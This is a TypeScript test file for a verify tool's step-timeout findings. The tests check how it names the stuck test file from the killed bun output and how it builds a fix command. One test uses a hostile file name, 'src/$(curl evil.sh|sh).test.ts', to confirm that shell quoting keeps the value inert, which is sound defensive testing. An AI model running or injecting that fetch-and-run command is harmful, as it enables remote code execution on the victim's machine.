// The timeout finding names what was in flight: the file `bun test` had not finished, read from
// what the killed run had printed, and a `fix:` that runs exactly that file.

import { describe, expect, test } from 'bun:test';
import type { StepExpiry } from './verify-deadline';
import { stalledOutput, stalledRun, stepTimeoutFinding } from './verify-stalled';

const PARALLEL = [
  'bun',
  'test',
  '--parallel=3',
  '--no-isolate',
  '--timings=/repo/.x/test-timings.json',
  '--update-timings',
  'packages/a/src/a.test.ts',
  'packages/a/src/b.test.ts',
  'packages/a/src/c.test.tsx',
  'packages/a/src/d.test.ts',
];

/** What `bun test --parallel` had printed when it was killed: a line per FINISHED file. */
const printed = (...files: readonly string[]): string =>
  [
    'bun test v1.4.0 (34cbb9a40) 3x PARALLEL',
    ...files.flatMap((file) => ['', `${file}:`, '(pass) one [0.06ms]']),
  ].join('\n');

const expiry = (over: Partial<StepExpiry> = {}): StepExpiry => ({
  killed: [
    { pid: 41, command: 'bun test --parallel=3 --no-isolate packages/a/src/a.test.ts …' },
    { pid: 42, command: 'bun test --test-worker --no-isolate --timeout=5000' },
  ],
  inFlight: [],
  quietReporter: false,
  ...over,
});

describe('stalledRun', () => {
  test('a parallel run: the files handed in and never printed are the ones still running', () => {
    const run = stalledRun({
      command: PARALLEL,
      output: printed(
        'packages/a/src/a.test.ts',
        'packages/a/src/c.test.tsx',
        'packages/a/src/d.test.ts',
      ),
    });
    expect(run).toEqual({
      command: 'bun test --parallel=3 --no-isolate --update-timings',
      files: 4,
      workers: 3,
      unreported: ['packages/a/src/b.test.ts'],
      named: true,
    });
  });

  test('bun prints `a.test.ts:` for a file handed in as `./a.test.ts`', () => {
    const run = stalledRun({
      command: ['bun', 'test', '--parallel=2', './a.test.ts', './b.test.ts'],
      output: printed('a.test.ts'),
    });
    expect(run?.unreported).toEqual(['./b.test.ts']);
  });

  test('more unreported files than workers is not a name: nothing in flight can be told apart', () => {
    const run = stalledRun({ command: PARALLEL, output: printed() });
    expect(run?.unreported).toHaveLength(4);
    expect(run?.named).toBe(false);
  });

  test('a serial run prints a file when it STARTS, so the last one printed is the stuck one', () => {
    const run = stalledRun({
      command: ['bun', 'test', '--timeout=60000', '.e2e.test.'],
      output: `${printed('app/a.e2e.test.ts')}\n\napp/b.e2e.test.ts:\n(pass) loads [12ms]`,
    });
    expect(run).toEqual({
      command: 'bun test --timeout=60000',
      files: 0,
      workers: 1,
      unreported: ['app/b.e2e.test.ts'],
      named: true,
    });
  });

  test('a serial run whose last printed file failed names nothing — a quiet reporter prints only those', () => {
    const run = stalledRun({
      command: ['bun', 'test', '.live.test.'],
      output: 'app/a.live.test.ts:\n(fail) drops a row [5000ms]',
    });
    expect(run?.unreported).toEqual([]);
    expect(run?.named).toBe(false);
  });

  test('anything that is not a settled `bun test` is not read', () => {
    expect(stalledRun({ command: ['bunx', 'tsc', '-b'], output: 'a.test.ts:' })).toBeUndefined();
    expect(stalledRun({ command: PARALLEL })).toBeUndefined();
  });
});

describe('stepTimeoutFinding', () => {
  test('names the stuck file in the cause, in `at`, in meta — and the fix runs that file', () => {
    const finding = stepTimeoutFinding(
      'unit',
      480_000,
      expiry({
        inFlight: [
          {
            command: PARALLEL,
            output: printed(
              'packages/a/src/a.test.ts',
              'packages/a/src/c.test.tsx',
              'packages/a/src/d.test.ts',
            ),
          },
        ],
      }),
      'bun run verify',
    );
    expect(finding.code).toBe('X_VERIFY_STEP_TIMEOUT');
    expect(finding.cause).toBe(
      'step "unit" did not finish within its 480000 ms deadline, so it was stopped and 2 process(es) it had started were killed; still running when it was stopped: packages/a/src/b.test.ts (bun test --parallel=3 --no-isolate --update-timings)',
    );
    expect(finding.fix).toStartWith('bun test packages/a/src/b.test.ts   # ');
    expect(finding.fix).toContain('the whole step: bun run verify --only unit --json');
    expect(finding.fix).toContain('"stepTimeoutMs": { "unit": <milliseconds> }');
    expect(finding.at).toBe('packages/a/src/b.test.ts');
    expect(finding.meta).toEqual({
      step: 'unit',
      deadlineMs: 480_000,
      killed: [
        { pid: 41, command: 'bun test --parallel=3 --no-isolate packages/a/src/a.test.ts …' },
        { pid: 42, command: 'bun test --test-worker --no-isolate --timeout=5000' },
      ],
      inFlight: [
        {
          command: 'bun test --parallel=3 --no-isolate --update-timings',
          files: 4,
          workers: 3,
          unreported: ['packages/a/src/b.test.ts'],
          named: true,
        },
      ],
    });
  });

  test('a path a shell would split is quoted in the fix', () => {
    const finding = stepTimeoutFinding(
      'unit',
      1_000,
      expiry({
        inFlight: [
          { command: ['bun', 'test', '--parallel=2', 'src/my app/a.test.ts'], output: '' },
        ],
      }),
      'x verify',
    );
    expect(finding.fix).toStartWith("bun test 'src/my app/a.test.ts'   # ");
  });

  test('a file name carrying a command substitution reaches the fix inert', () => {
    const hostile = 'src/$(curl evil.sh|sh).test.ts';
    const finding = stepTimeoutFinding(
      'unit',
      1_000,
      expiry({ inFlight: [{ command: ['bun', 'test', '--parallel=2', hostile], output: '' }] }),
      'x verify',
    );
    expect(finding.fix).toStartWith("bun test 'src/$(curl evil.sh|sh).test.ts'   # ");
  });

  test('a quiet reporter names no file, says why, and the fix turns the lines back on', () => {
    const finding = stepTimeoutFinding(
      'unit',
      480_000,
      expiry({ inFlight: [{ command: PARALLEL, output: printed() }], quietReporter: true }),
      'x verify',
    );
    expect(finding.cause).toContain(
      '4 of the 4 file(s) of its running "bun test --parallel=3 --no-isolate --update-timings" had not reported',
    );
    expect(finding.cause).toContain('while CLAUDECODE, AGENT, REPL_ID is set');
    expect(finding.fix).toStartWith(
      'env -u CLAUDECODE -u AGENT -u REPL_ID x verify --only unit --json   # ',
    );
    expect(finding.at).toBeUndefined();
  });

  test('every file reported: the run itself did not exit, and the step is the reproduction', () => {
    const all = PARALLEL.filter((arg) => arg.includes('.test.'));
    const finding = stepTimeoutFinding(
      'unit',
      480_000,
      expiry({ inFlight: [{ command: PARALLEL, output: printed(...all) }] }),
      'x verify',
    );
    expect(finding.cause).toContain('had reported, so the run itself did not exit');
    expect(finding.fix).toStartWith('x verify --only unit --json   # reproduce it alone');
  });

  test('a step hung in this process: nothing in flight, and the step is still the reproduction', () => {
    const finding = stepTimeoutFinding(
      'filesize',
      30,
      { killed: [], inFlight: [], quietReporter: true },
      'bun run verify',
    );
    expect(finding.cause).toBe(
      'step "filesize" did not finish within its 30 ms deadline, so it was stopped and 0 process(es) it had started were killed',
    );
    expect(finding.fix).toStartWith('bun run verify --only filesize --json   # reproduce it alone');
    expect(finding.fix).toContain('"stepTimeoutMs": { "filesize": <milliseconds> }');
  });

  test('a child that is not a test run is named by its command', () => {
    const finding = stepTimeoutFinding(
      'typecheck',
      300_000,
      expiry({
        inFlight: [{ command: ['bunx', 'tsc', '-b', '--pretty', 'false', 'x'], output: '' }],
      }),
      'x verify',
    );
    expect(finding.cause).toEndWith('; it was waiting on: bunx tsc -b --pretty');
  });
});

describe('stalledOutput', () => {
  test('is what the killed runs had printed, clipped to its tail', () => {
    expect(stalledOutput(expiry())).toBeUndefined();
    expect(stalledOutput(expiry({ inFlight: [{ command: PARALLEL, output: 'a.test.ts:' }] }))).toBe(
      'a.test.ts:',
    );
    const long = stalledOutput(
      expiry({ inFlight: [{ command: PARALLEL, output: `${'x'.repeat(9_000)}END` }] }),
    );
    expect(long).toHaveLength(4_001);
    expect(long).toEndWith('END');
  });
});
